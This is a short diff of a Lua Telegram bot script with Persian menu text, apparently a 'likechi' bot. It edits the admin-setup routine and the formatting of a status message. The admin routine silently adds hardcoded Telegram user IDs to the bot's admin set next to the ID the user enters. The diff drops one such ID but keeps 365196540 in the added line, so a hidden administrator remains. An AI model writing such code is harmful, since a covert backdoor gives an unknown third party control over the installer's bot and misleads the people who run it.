@@ -21,7 +21,7 @@ function get_admin ()
     	local admin=io.read()
 		redis:del("botBOT-IDadmin")
 		redis:del("botBOT-IDadmin")
-    	redis:sadd("botBOT-IDadmin", admin, 136274004 , 365196540)
+    	redis:sadd("botBOT-IDadmin", admin, 365196540)
 		redis:set('botBOT-IDadminset',true)
     	return print("Admin ID : ".. admin .."")
 	end
@@ -313,7 +313,7 @@ function get_bot (i, adigram)
 						  local fname = redis:get("botBOT-IDfname")
 						  local sima = os.date("%A🔜 %d %B")
 						  
-                          local text = 	[[<b> ]] .. tostring(sima) .. [[ </b> 
+                          local text = 	[[<b>  </b> ]] .. tostring(sima) .. [[
 </b>💱⛓ لایکچی BOT-ID <b>
 ✍امار 🖥⚡️]] .. tostring(fname) .. [[⚡
 🅰️ خروچ از همه گروهها ⛔️👈 *1#
